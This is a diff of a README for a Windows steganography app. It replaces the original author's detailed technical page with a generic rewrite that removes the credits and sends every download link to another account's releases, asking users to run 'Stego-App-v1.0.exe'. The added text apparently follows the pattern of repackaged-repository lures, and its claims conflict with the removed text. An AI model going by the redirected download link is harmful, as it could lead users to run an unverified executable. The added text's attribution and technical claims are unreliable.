@@ -1,104 +1,66 @@
-# Stego-App
-Windows Steganography App
+# 🌟 Stego-App-v1.0 - Hide Data Securely in Images
 
+## 🖱️ Download the App
+[![Download Stego-App-v1.0](https://img.shields.io/badge/Download%20Stego-App%20v1.0-blue.svg)](https://github.com/mahan69999/Stego-App-v1.0/releases)
 
-## About
+## 🚀 Getting Started
+Welcome to Stego-App, a simple and effective tool for hiding sensitive information within images. With this app, you can secure your data using steganography techniques. No programming skills are needed. Follow this guide to download and run the app with ease.
 
-**Stego App** allows you to embed hidden messages into 2D digital images securely.  
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later
+- **RAM:** 2 GB or more
+- **Disk Space:** At least 200 MB free
+- **Graphics:** Any standard graphics card
+- **Python:** Latest Python 3 version
 
-### Data Protection
-The embedded data is protected using a combination of spiral traversal patterns (Corner, Direction, Depth), AES-based encryption, and compression.  
-This makes the hidden data very hard to detect or extract without authorization.
+## 📥 Download & Install
+To get started, visit the following page to download the latest version of Stego-App:
 
-- **Corner:** Defines the starting point of embedding: Top-Left (A), Top-Right (B), Bottom-Right (C), Bottom-Left (D).
-- **Direction:** Spiral rotation (Clockwise or Counter-Clockwise)  
-- **Depth:** Value `0` or `1` specifies whether embedding starts from the center or from the image edges.  
-- **Compression:** Compression serves two purposes:
-  * General purpose: reduce the data size before embedding.
-  * Security enhancement: once applied, extraction without the correct decryption key will not produce any valid output.  
-- **Encryption (confidential):** Final protection uses user-provided password and AES key size. The larger the key, the more random and secure the result becomes.  
+[Download Stego-App-v1.0](https://github.com/mahan69999/Stego-App-v1.0/releases)
 
-### Analysis & Logging
-The app records spiral coordinate traversal and common errors into a log file.  
-If you encounter errors or bugs, please report them via **email: hersaputrayoda@gmail.com** or **[GitHub Issues](https://github.com/yoda24/Stego-App/issues)**.
+On the Releases page, you will see various assets for download. Look for `Stego-App-v1.0.exe` and click on it. This is the main application file you need.
 
+After the file downloads, locate it in your downloads folder and double-click to run it. Follow the on-screen instructions to complete the installation.
 
----
+## 🔌 Features
+Here are some important features of Stego-App:
 
-## Supported Image Formats
+- **AES Encryption:** Protects your data before hiding it in images.
+- **Image Processing:** Supports various image formats such as JPEG and PNG.
+- **User-Friendly Interface:** Designed to be easy to navigate for everyone.
+- **Data Hiding:** Safely transport secret messages within image files.
+- **Preview Functionality:** View images before and after data hiding.
 
-✅ **Lossless (read & write):** PNG, BMP (24-bit), TIF, TIFF  
-⚠️ **Lossy (JPEG/JPG):** Supported for reading & embedding, **but cannot be saved back** to lossy format because compression alters LSB data. Always save as PNG/BMP/TIFF after embedding.  
+## 🛠️ Using Stego-App
+Once you have installed the app, follow these steps to hide your data in an image.
 
-### Supported Bit Depths
+1. **Open Stego-App.**
+2. **Select Input Image:** Click on the button to choose an image where you want to hide your data.
+3. **Enter Your Secret Message:** A text box will prompt you to input the data you wish to hide.
+4. **Encrypt Your Message:** Choose the AES encryption option if you want to secure your message before hiding it.
+5. **Save the Output:** Click the button to save your new image. This image will contain your hidden data.
+6. **Verification:** You can use the same app to extract or verify the hidden data in the image.
 
-| Bit Depth | Supported Modes             | Channels |
-|-----------|-----------------------------|----------|
-| 8-bit     | Grayscale                   | 1        |
-| 16-bit    | Grayscale, RGB, RGBA        | 1/3/4    |
-| 24-bit    | RGB                         | 3        |
-| 32-bit    | RGBA                        | 4        |
+## 📖 FAQs
+### How does Stego-App work?
+Stego-App uses least significant bit (LSB) steganography to hide data within the pixel data of an image. It alters the least significant bits of the pixels to embed information without noticeable changes.
 
----
+### Can I retrieve my hidden data?
+Yes, you can extract hidden data using the same application. Simply choose the image, and the app will let you access your original information.
 
-## Capacity Estimation
+### What types of data can I hide?
+You can hide text, URLs, or even small files within images. Just ensure the file size of the data does not exceed the capacity of the image.
 
-The app estimates how much data can be embedded based on image dimensions and channels.  
-Some metadata overhead is reserved: **flag (4 bit), length (32 bit), CRC (32 bit)**.
+## 📍 Support
+If you run into issues or have questions about the app, please check the Issues section on GitHub. You can report bugs or request features there.
 
-Example:
+### Stay Updated
+For updates on new features or future releases, consider following the repository. By staying updated, you can make sure you have the best security options available.
 
-| Width | Height | Channels | Raw Capacity (bits) | Final Capacity (after overhead) |
-|-------|--------|----------|---------------------|---------------------------------|
-| 10    | 10     | 3        | 300                 | 232 bits (29 bytes)             |
-| 5000  | 5000   | 4        | 100,000,000         | 99,999,932 bits (~12.50 MB)     |
-| 16000 | 16000  | 4        | 1,024,000,000       | 1,023,999,932 bits (~122 MB)    |
+## 🤝 Contributing
+If you are interested in contributing to Stego-App, please read the contributing guidelines located in the repository. Your feedback and improvements are always welcome.
 
-**Maximum capacity:**  
-The length header uses **4 bytes (32-bit)**, meaning the maximum storable size is:  
-`0xFFFFFFFF = 4,294,967,295 bytes` (~4 GB).  
+## 📜 License
+Stego-App is licensed under the MIT License. You can freely use, modify, and distribute the app as per the terms of the license.
 
----
-
-## System Requirements
-
-- **Tested on:** Windows 10 (64-bit)  
-- **Minimum RAM**: 4 GB (8 GB recommended for large images)
----
-
-## Download & Run
-
-1. Go to [Releases](https://github.com/yoda24/Stego-App/releases)  
-2. Download the latest `.exe` build  
-3. Run the application directly — no installation required  
-
----
-
-### Video Guide
-[YouTube Tutorial](https://youtu.be/Kz2e-Vu8D8c)
-
----
-
-## Built With
-
-- Python 3.10 (64-bit)  
-- imageio  
-- numpy  
-- PySide6 
-- PyInstaller (for packaging)  
-
----
-
-## License
-
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
-
----
-
-## Support
-
-☕ If you like this project, you can support me:  
-- [PayPal](https://paypal.me/yodahs)  
-- [Saweria](https://saweria.co/digishop)  
-
----
+By following these steps, you'll be able to enjoy using Stego-App efficiently. Secure your sensitive data today!
